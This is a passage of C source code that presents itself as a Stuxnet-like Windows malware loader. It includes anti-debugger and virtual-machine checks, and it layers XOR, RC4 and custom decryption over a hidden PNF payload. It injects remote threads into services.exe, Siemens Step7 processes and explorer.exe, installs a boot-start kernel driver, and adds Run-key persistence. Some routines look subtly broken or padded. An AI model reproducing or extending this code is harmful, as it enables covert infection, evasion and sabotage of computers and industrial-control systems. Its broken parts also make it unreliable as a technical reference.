    GetWindowsDirectoryW(g_Oem7aCtx.szWindowsPath, OEM7A_MAX_PATH);
    wsprintfW(g_Oem7aCtx.szInfPath, L"%s\\inf", g_Oem7aCtx.szWindowsPath);
    wsprintfW(g_Oem7aCtx.szPNFPath, L"%s\\oem7A.PNF", g_Oem7aCtx.szInfPath);
    OEM7A_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID OEM7A_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_Oem7aCtx.hMutex) {
        CloseHandle(g_Oem7aCtx.hMutex);
        g_Oem7aCtx.hMutex = NULL;
    }
    if (g_Oem7aCtx.hThread) {
        CloseHandle(g_Oem7aCtx.hThread);
        g_Oem7aCtx.hThread = NULL;
    }
    if (g_Oem7aCtx.hStopEvent) {
        CloseHandle(g_Oem7aCtx.hStopEvent);
        g_Oem7aCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_Oem7aCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL OEM7A_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Oem7aCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL OEM7A_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL OEM7A_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    DWORD dwDebugPort = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    if (pNtAllocateVirtualMemory) {
        NTSTATUS status = pNtAllocateVirtualMemory(
            NtCurrentProcess(),
            &dwDebugPort,
            0,
            (PSIZE_T)&dwDebugPort,
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if (NT_SUCCESS(status)) {
            pNtProtectVirtualMemory(
                NtCurrentProcess(),
                (PVOID*)&dwDebugPort,
                (PSIZE_T)&dwDebugPort,
                PAGE_NOACCESS,
                NULL
            );
        }
    }
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM7A_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD OEM7A_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID OEM7A_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID OEM7A_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID OEM7A_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID OEM7A_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID OEM7A_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL OEM7A_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    POEM7A_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwDataSize;
    DWORD dwKey = OEM7A_ENCRYPTION_KEY;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(OEM7A_HEADER)) {
        return FALSE;
    }
    pHeader = (POEM7A_HEADER)pEncrypted;
    if (pHeader->dwMagic != OEM7A_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        return FALSE;
    }
    dwDataSize = dwEncryptedSize - sizeof(OEM7A_HEADER);
    if (dwDataSize > *pdwDecryptedSize) {
        return FALSE;
    }
    memcpy(pDecrypted, pEncrypted + sizeof(OEM7A_HEADER), dwDataSize);
    for (DWORD round = 0; round < OEM7A_DECRYPTION_ROUNDS; round++) {
        OEM7A_XORDecrypt(pDecrypted, dwDataSize, (PBYTE)&dwKey, sizeof(DWORD));
        OEM7A_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM7A_RC4Crypt(pDecrypted, dwDataSize, SBox, &i, &j);
        OEM7A_SimpleDecrypt(pDecrypted, dwDataSize);
    }
    *pdwDecryptedSize = dwDataSize;
    g_dwDecryptionCount++;
    return TRUE;
}

static BOOL OEM7A_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    POEM7A_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwTotalSize;
    DWORD dwKey = OEM7A_ENCRYPTION_KEY;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) {
        return FALSE;
    }
    dwTotalSize = sizeof(OEM7A_HEADER) + dwDecryptedSize;
    if (dwTotalSize > *pdwEncryptedSize) {
        return FALSE;
    }
    pHeader = (POEM7A_HEADER)pEncrypted;
    pHeader->dwMagic = OEM7A_MAGIC;
    pHeader->dwVersion = OEM7A_VERSION;
    pHeader->dwTotalSize = dwTotalSize;
    pHeader->dwEncryptedSize = dwDecryptedSize;
    pHeader->dwDecryptedSize = dwDecryptedSize;
    pHeader->dwChecksum = OEM7A_ComputeCRC32(pDecrypted, dwDecryptedSize);
    pHeader->dwTimestamp = GetTickCount();
    ZeroMemory(pHeader->dwReserved, sizeof(pHeader->dwReserved));
    memcpy(pEncrypted + sizeof(OEM7A_HEADER), pDecrypted, dwDecryptedSize);
    for (DWORD round = 0; round < OEM7A_DECRYPTION_ROUNDS; round++) {
        OEM7A_SimpleEncrypt(pEncrypted + sizeof(OEM7A_HEADER), dwDecryptedSize);
        OEM7A_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM7A_RC4Crypt(pEncrypted + sizeof(OEM7A_HEADER), dwDecryptedSize, SBox, &i, &j);
        OEM7A_XORDecrypt(pEncrypted + sizeof(OEM7A_HEADER), dwDecryptedSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = dwTotalSize;
    return TRUE;
}

static BOOL OEM7A_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    return TRUE;
}

static BOOL OEM7A_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL OEM7A_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(OEM7A_RESOURCE_MAIN_DLL), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL OEM7A_BuildPELoader(VOID) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD dwSize;
    BYTE *pLoader;
    DWORD dwOffset = 0;
    DWORD dwRelocDelta = 0;
    dwSize = OEM7A_PE_LOADER_SIZE;
    pLoader = g_PELoaderStub;
    *(DWORD*)(pLoader + dwOffset) = 0x4D5A9000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000003;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000004;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0xFFFF0000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x000000B8;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000040;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000080;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(WORD*)(pLoader + dwOffset) = 0x0E1F;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0xBA0E;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x00B4;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x09CD;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0xB821;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x4C01;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x21CD;
    dwOffset += 2;
    memcpy(pLoader + dwOffset, "This program cannot be run in DOS mode.", 40);
    dwOffset += 40;
    for (DWORD i = 0; i < 64; i++) {
        *(DWORD*)(pLoader + dwOffset) = 0x00000000;
        dwOffset += 4;
    }
    *(DWORD*)(pLoader + dwOffset) = 0x00004550;
    dwOffset += 4;
    *(WORD*)(pLoader + dwOffset) = 0x014C;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x0001;
    dwOffset += 2;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(WORD*)(pLoader + dwOffset) = 0x00E0;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x000F;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x010B;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x0000;
    dwOffset += 2;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00001000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00002000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00001000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00004000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    return TRUE;
}

static BOOL OEM7A_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!OEM7A_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    if (!OEM7A_WritePNFToDisk(g_Oem7aCtx.szPNFPath, pData, dwSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL OEM7A_LoadMainDLL(VOID) {
    PBYTE pEncrypted;
    PBYTE pDecrypted;
    DWORD dwEncryptedSize;
    DWORD dwDecryptedSize;
    HMODULE hModule;
    FARPROC pExport;
    WCHAR szAslrPath[OEM7A_MAX_PATH];
    DWORD dwRandom;
    if (!OEM7A_ReadPNFFromDisk(g_Oem7aCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return FALSE;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    if (!OEM7A_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    wcscpy_s(szAslrPath, OEM7A_MAX_PATH, g_Oem7aCtx.szWindowsPath);
    wcscat_s(szAslrPath, OEM7A_MAX_PATH, L"\\");
    wcscat_s(szAslrPath, OEM7A_MAX_PATH, L"KERNEL32.DLL.ASLR.");
    dwRandom = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(ULONG_PTR)pDecrypted;
    wsprintfW(szAslrPath + wcslen(szAslrPath), L"%08x", dwRandom);
    wcscat_s(szAslrPath, OEM7A_MAX_PATH, L".dll");
    if (!CopyFileW(g_Oem7aCtx.szModulePath, szAslrPath, FALSE)) {
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    hModule = LoadLibraryW(szAslrPath);
    if (!hModule) {
        DeleteFileW(szAslrPath);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    pExport = GetProcAddress(hModule, "Export15");
    if (pExport) {
        ((void (*)(void))pExport)();
        g_dwPELoadCount++;
    }
    DeleteFileW(szAslrPath);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return TRUE;
}

static BOOL OEM7A_InjectIntoProcess(DWORD dwPID, PBYTE pDLL, DWORD dwDLLSize, WORD wExportFunction) {
    HANDLE hProcess;
    PVOID pRemoteBase;
    SIZE_T RegionSize;
    ULONG OldProtect;
    HANDLE hThread;
    NTSTATUS status;
    DWORD dwExportOffset;
    if (!pDLL || dwDLLSize == 0) return FALSE;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return FALSE;
    RegionSize = dwDLLSize + OEM7A_PE_LOADER_SIZE;
    pRemoteBase = NULL;
    status = pNtAllocateVirtualMemory(
        hProcess,
        &pRemoteBase,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        CloseHandle(hProcess);
        return FALSE;
    }
    status = pNtWriteVirtualMemory(
        hProcess,
        pRemoteBase,
        pDLL,
        dwDLLSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        pNtFreeVirtualMemory(hProcess, &pRemoteBase, &RegionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    status = pNtWriteVirtualMemory(
        hProcess,
        (PBYTE)pRemoteBase + dwDLLSize,
        g_PELoaderStub,
        OEM7A_PE_LOADER_SIZE,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        pNtFreeVirtualMemory(hProcess, &pRemoteBase, &RegionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    dwExportOffset = 0;
    if (wExportFunction == 1) {
        dwExportOffset = 0x1000;
    } else if (wExportFunction == 2) {
        dwExportOffset = 0x2000;
    }
    status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PBYTE)pRemoteBase + dwDLLSize + dwExportOffset,
        pRemoteBase,
        0,
        0,
        0,
        0,
        NULL
    );
    if (NT_SUCCESS(status)) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        g_dwInjectionCount++;
    }
    pNtFreeVirtualMemory(hProcess, &pRemoteBase, &RegionSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

static BOOL OEM7A_BuildDriverConfig(VOID) {
    OEM7A_INJECTION_ELEMENT *pElement;
    g_DriverConfig.dwNumberOfInjections = 4;
    pElement = &g_DriverConfig.Elements[0];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 1;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"services.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"services.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7A.PNF");
    pElement = &g_DriverConfig.Elements[1];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 2;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"S7tgtopx.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"S7tgtopx.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7A.PNF");
    pElement = &g_DriverConfig.Elements[2];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 2;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"CCProjectMgr.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"CCProjectMgr.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7A.PNF");
    pElement = &g_DriverConfig.Elements[3];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 2;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"explorer.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"explorer.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7m.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7m.PNF");
    return TRUE;
}

static BOOL OEM7A_WriteDriverConfig(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    BYTE encrypted[4096];
    DWORD dwEncryptedSize = 4096;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\MRxCls", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Data", 0, REG_BINARY, (BYTE*)&g_DriverConfig, sizeof(g_DriverConfig));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL OEM7A_LoadMrxCls(VOID) {
    HANDLE hSCManager;
    HANDLE hService;
    WCHAR szPath[OEM7A_MAX_PATH];
    wsprintfW(szPath, L"%s\\drivers\\mrxcls.sys", g_Oem7aCtx.szSystemPath);
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return FALSE;
    hService = CreateServiceW(hSCManager, L"MRxCls", L"MRxCls", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_BOOT_START, SERVICE_ERROR_NORMAL, szPath, NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        hService = OpenServiceW(hSCManager, L"MRxCls", SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    StartServiceW(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

static BOOL OEM7A_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szPath[OEM7A_MAX_PATH];
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    GetModuleFileNameW(NULL, szPath, OEM7A_MAX_PATH);
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Stuxnet", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL OEM7A_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, L"19790509", NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI OEM7A_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_Oem7aCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM7A_IsExpired()) {
            break;
        }
        if (!OEM7A_ReadRegistry()) {
            OEM7A_WriteRegistry();
        }
        g_dwInfectionCount++;
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL OEM7A_StartWorker(VOID) {
    g_Oem7aCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Oem7aCtx.hStopEvent) return FALSE;
    g_Oem7aCtx.hThread = CreateThread(NULL, 0, OEM7A_WorkerThread, NULL, 0, NULL);
    if (!g_Oem7aCtx.hThread) {
        CloseHandle(g_Oem7aCtx.hStopEvent);
        g_Oem7aCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM7A_StopWorker(VOID) {
    if (g_Oem7aCtx.hStopEvent) {
        SetEvent(g_Oem7aCtx.hStopEvent);
    }
    if (g_Oem7aCtx.hThread) {
        WaitForSingleObject(g_Oem7aCtx.hThread, 5000);
        CloseHandle(g_Oem7aCtx.hThread);
        g_Oem7aCtx.hThread = NULL;
    }
    if (g_Oem7aCtx.hStopEvent) {
